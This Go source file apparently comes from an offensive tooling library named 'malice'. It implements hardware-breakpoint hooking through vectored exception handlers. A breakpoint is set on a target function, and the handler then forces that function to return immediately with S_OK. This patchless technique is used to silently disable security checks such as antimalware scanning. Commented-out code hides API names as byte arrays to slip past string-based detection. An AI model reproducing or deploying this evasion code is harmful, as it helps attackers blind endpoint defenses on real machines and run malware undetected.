package veh

import (
	"fmt"
	"unsafe"

	"github.com/redt1de/malice/pkg/callz"
	"golang.org/x/sys/windows"
)

// References:
// https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e

var (
	TargetAddr uintptr
	Mode       = callz.MODE_NORMAL

	// ch = callz.New(Mode, string([]byte{'n', 't', 'd', 'l', 'l'}), string([]byte{'R', 't', 'l', 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'C', 'o', 'n', 't', 'i', 'n', 'u', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'r'}))
	// eh = callz.New(Mode, string([]byte{'n', 't', 'd', 'l', 'l'}), string([]byte{'R', 't', 'l', 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r'}))
	// gtc = callz.New(Mode, string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), string([]byte{'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't'}))
	// stc = callz.New(Mode, string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), string([]byte{'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't'}))
	ch  = windows.NewLazyDLL("ntdll.dll").NewProc("RtlAddVectoredContinueHandler")
	eh  = windows.NewLazyDLL("ntdll.dll").NewProc("RtlAddVectoredExceptionHandler")
	gtc = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetThreadContext")
	stc = windows.NewLazySystemDLL("kernel32.dll").NewProc("SetThreadContext")
)

//go:nosplit
func defaultHandler(e *EXCEPTION_POINTERS) uintptr {
	if e.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP && e.ExceptionRecord.ExceptionAddress == TargetAddr {
		// get the return address from the stack, and set  RIP to it
		rsp2ptr := unsafe.Pointer(uintptr(e.ContextRecord.Rsp))
		addrFromRsp := unsafe.Slice((*byte)(unsafe.Pointer(uintptr(rsp2ptr))), 8) //readMemory(uintptr(rsp2ptr), 8)
		ReturnAddress := *(*uint64)(unsafe.Pointer(&addrFromRsp[0]))
		e.ContextRecord.Rip = ReturnAddress

		// adjust stack
		e.ContextRecord.Rsp += 8

		// set the return value
		e.ContextRecord.Rax = 0 // S_OK
		// e.ContextRecord.Rax = 0x80070057 // E_INVALIDARG

		// clear the breakpoint
		e.ContextRecord.Dr0 = 0
		e.ContextRecord.Dr7 = SetBits(e.ContextRecord.Dr7, 0, 1, 0)
		e.ContextRecord.Dr6 = 0
		// set trap/resume flag
		e.ContextRecord.EFlags |= 0x10000
		return uintptr(UEXCEPTION_CONTINUE_EXECUTION)
	}

	return uintptr(EXCEPTION_CONTINUE_SEARCH)
}

func AddVeh(targetFunc, handler uintptr) error {
	if handler == 0 {
		handler = windows.NewCallback(defaultHandler)
	}

	TargetAddr = targetFunc
	chand, _, _ := ch.Call(1, windows.NewCallback(continueHandler))
	if chand == 0 {
		return fmt.Errorf("failed to add vectored continue handler")
	}

	ehand, _, _ := eh.Call(uintptr(1), handler)
	if ehand == 0 {
		return fmt.Errorf("failed to add vectored exception handler")
	}

	ctx := CONTEXT{}
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS

	ct := windows.CurrentThread()
	// TODO: implement error checking, some syscall types may not provide return values, like proxycall
	r1, _, err := gtc.Call(uintptr(ct), uintptr(unsafe.Pointer(&ctx)))
	if r1 == 0 && Mode != callz.MODE_PROXYCALL {
		return fmt.Errorf("failed to get thread context: %v", err)
	}

	EnableBreakpoint(&ctx, targetFunc, 0)

	// TODO: implement error checking, some syscall types may not provide return values, like proxycall
	r1, _, err = stc.Call(uintptr(ct), uintptr(unsafe.Pointer(&ctx)))
	if r1 == 0 && Mode != callz.MODE_PROXYCALL {
		return fmt.Errorf("failed to set thread context: %v", err)
	}

	return nil
}

func EnableBreakpoint(ctx *CONTEXT, address uintptr, index int) {
	switch index {
	case 0:
		ctx.Dr0 = uint64(address)
	case 1:
		ctx.Dr1 = uint64(address)
	case 2:
		ctx.Dr2 = uint64(address)
	case 3:
		ctx.Dr3 = uint64(address)
	}

	ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0)

	ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1)
	ctx.Dr6 = 0
}

// func func2Ptr(f interface{}) uintptr {
// 	return *(*[2]*uintptr)(unsafe.Pointer(&f))[1]
// }

func SetBits(dw uint64, lowBit int, bits int, newValue uint64) uint64 {
	mask := (1 << bits) - 1
	dw = (dw & ^(uint64(mask) << lowBit)) | (newValue << lowBit)
	return dw
}

// continue handler is needed since go uses VEH, and will default to panic without it.
//
//go:nosplit
func continueHandler(e *EXCEPTION_POINTERS) uintptr {
	return 0xffffffff // just return EXCEPTION_CONTINUE_EXECUTION
}
